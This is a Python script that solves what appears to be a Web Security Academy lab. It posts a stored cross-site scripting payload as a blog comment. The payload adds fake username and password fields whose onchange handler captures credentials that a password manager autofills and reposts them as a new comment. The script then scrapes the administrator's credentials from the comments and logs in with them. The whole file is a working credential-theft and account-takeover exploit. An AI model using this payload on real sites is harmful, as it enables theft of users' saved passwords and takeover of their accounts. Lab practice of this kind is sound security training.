import requests
from bs4 import BeautifulSoup
import re

# Initialize the session
s = requests.Session()
site = '0aa1006c031c315a805112bd009c00fa.web-security-academy.net'
blog_post_url = f'https://{site}/post?postId=1'

# Craft the XSS payload
comment_xss = '''
<input name="username" id="username">
<input type="password" name="password" 
onchange="document.forms[0].email.value='yourname@pdx.edu';
          document.forms[0].name.value='yourname';
          document.forms[0].comment.value=document.getElementById('username').value + ':' + this.value;
          document.forms[0].website.value='https://pdx.edu';
          document.forms[0].submit();">
'''

# Function to post the exploit
def try_post(name, comment_xss):
    # Get the page to retrieve CSRF token
    resp = s.get(blog_post_url)
    soup = BeautifulSoup(resp.text, 'html.parser')
    csrf = soup.find('input', {'name': 'csrf'}).get('value')

    # Prepare the comment data with the XSS payload
    comment_url = f'https://{site}/post/comment'
    comment_data = {
        'csrf': csrf,
        'postId': '1',
        'comment': comment_xss,
        'name': name,
        'email': f'{name}@pdx.edu',
        'website': 'https://pdx.edu'
    }
    
    # Post the comment with XSS payload
    resp = s.post(comment_url, data=comment_data)
    print(f"[+] Comment posted by {name} with XSS payload.")

# Function to extract administrator credentials from comments
def extract_credentials():
    resp = s.get(blog_post_url)
    soup = BeautifulSoup(resp.text, 'html.parser')

    for p in soup.find_all('p'):
        if 'administrator' in p.text:
            credentials = p.text.strip().split(':')
            return credentials

    return None

# Function to log in using captured credentials
def login_with_credentials(credentials):
    login_url = f'https://{site}/login'
    resp = s.get(login_url)
    soup = BeautifulSoup(resp.text, 'html.parser')
    csrf = soup.find('input', {'name': 'csrf'}).get('value')

    # Prepare login data
    logindata = {
        'csrf': csrf,
        'username': credentials[0],
        'password': credentials[1]
    }

    # Submit login request
    resp = s.post(login_url, data=logindata)

    # Check for successful login
    if "Congratulations" in resp.text:
        print("[+] Level solved!")
    else:
        print("[-] Login failed.")

# Main function to tie everything together
def main():
    # Step 1: Post XSS payload to exfiltrate credentials
    try_post("yourname", comment_xss)

    # Step 2: Wait a minute for admin to autofill the password manager
    print("[+] Waiting for admin to autofill credentials...")
    import time
    time.sleep(60)

    # Step 3: Extract administrator credentials from the comment section
    credentials = extract_credentials()
    if credentials:
        print(f"[+] Found credentials: {credentials}")
    else:
        print("[-] Credentials not found in the comments.")
        return

    # Step 4: Log in with the captured credentials
    login_with_credentials(credentials)

# Run the main function
if __name__ == "__main__":
    main()
